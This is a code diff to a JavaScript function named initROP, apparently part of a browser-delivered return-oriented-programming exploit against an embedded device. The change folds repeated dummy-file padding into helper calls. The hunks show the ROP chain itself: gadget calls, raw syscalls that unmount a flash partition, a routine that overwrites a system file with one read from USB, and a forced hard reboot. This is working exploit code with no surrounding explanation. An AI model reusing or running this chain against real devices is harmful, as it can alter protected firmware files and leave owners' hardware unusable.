@@ -34,15 +34,7 @@ function initROP(init)
 		+getPath(lines_qrc_usb).convert()
 		+fill_by_4bytes(0xC,dbyte00)
 		+lines_qrc_blind.convert()
-		+fill_by_4bytes(0xC,dbyte00)
-		+getPath(dummy1_usb).convert()
-		+fill_by_4bytes(0xC,dbyte00)
-		+dummy1_blind.convert()
-		+fill_by_4bytes(0xC,dbyte00)
-		+getPath(dummy2_usb).convert()
-		+fill_by_4bytes(0xC,dbyte00)
-		+dummy2_blind.convert()
-		+fill_by_4bytes(0xC,dbyte00)
+		+make_dummy_xtra2()
 		+fill_by_16bytes(0x70,dbyte00)
 		+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)+callsub(gadget12_addr,2,0,0,0,0,0,0,0,0,0x80)+syscall(sc_sm_shutdown,hard_reboot,0,0,0,0,0,0,0)
 		+unescape("\uFD7E");
@@ -67,25 +59,8 @@ function initROP(init)
 		lines_qrc_blind_writelen_addr=lines_qrc_blindfd_addr+word_size;
 		store_idx_arr1[0]=(lines_qrc_blind_writelen_addr-flash_partition_addr+0x8)/2;
 		
-		dummy1_usb_addr=lines_qrc_blind_writelen_addr+dword_size;
-		dummy1_usbfd_addr=dummy1_usb_addr+getPath(dummy1_usb).convertedSize();
-		dummy1_usb_readlen_addr=dummy1_usbfd_addr+word_size;
+		null_addr=lines_qrc_blind_writelen_addr+dword_size+make_dummy_null_padding2()+dword_size;
 		
-		dummy1_blind_addr=dummy1_usb_readlen_addr+dword_size;
-		dummy1_blindfd_addr=dummy1_blind_addr+dummy1_blind.convertedSize();
-		dummy1_blind_writelen_addr=dummy1_blindfd_addr+word_size;
-		//store_idx_arr1[1]=(dummy1_blind_writelen_addr-flash_partition_addr+0x8)/2;
-		
-		dummy2_usb_addr=dummy1_blind_writelen_addr+dword_size;
-		dummy2_usbfd_addr=dummy2_usb_addr+getPath(dummy2_usb).convertedSize();
-		dummy2_usb_readlen_addr=dummy2_usbfd_addr+word_size;
-		
-		dummy2_blind_addr=dummy2_usb_readlen_addr+dword_size;
-		dummy2_blindfd_addr=dummy2_blind_addr+dummy2_blind.convertedSize();
-		dummy2_blind_writelen_addr=dummy2_blindfd_addr+word_size;
-		//store_idx_arr1[2]=(dummy2_blind_writelen_addr-flash_partition_addr+0x8)/2;
-		
-		null_addr=dummy2_blind_writelen_addr+dword_size;
 		store_idx_arr2[0]=(null_addr-flash_partition_addr+0xC)/2;
 		stat_addr=null_addr+dword_size*0x3;
 		reboot_sf_addr=stat_addr+dword_size*0xB;
@@ -94,8 +69,6 @@ function initROP(init)
 		+syscall(sc_fs_umount,flash_partition_addr,fs_addr,mount_path_addr,0,0,0,0,0)
 		+copy_file_overwrite(lines_qrc_usb_addr,lines_qrc_blind_addr,lines_qrc_usbfd_addr,lines_qrc_blindfd_addr,lines_qrc_buf_addr,lines_qrc_usb_readlen_addr,lines_qrc_blind_writelen_addr,stat_addr,null_addr,null_addr+0x8)
 		+optional_reboot1(reboot_sf_addr,lines_qrc_blind_writelen_addr)
-		//+callsub(gadget12_addr,2,0,0,0,0,0,0,0,0,0x80)
-		//+syscall(sc_sm_shutdown,hard_reboot,0,0,0,0,0,0,0)
 		+stack_frame_exit();
 		//############################ End stack frame ###############################################################	
 		
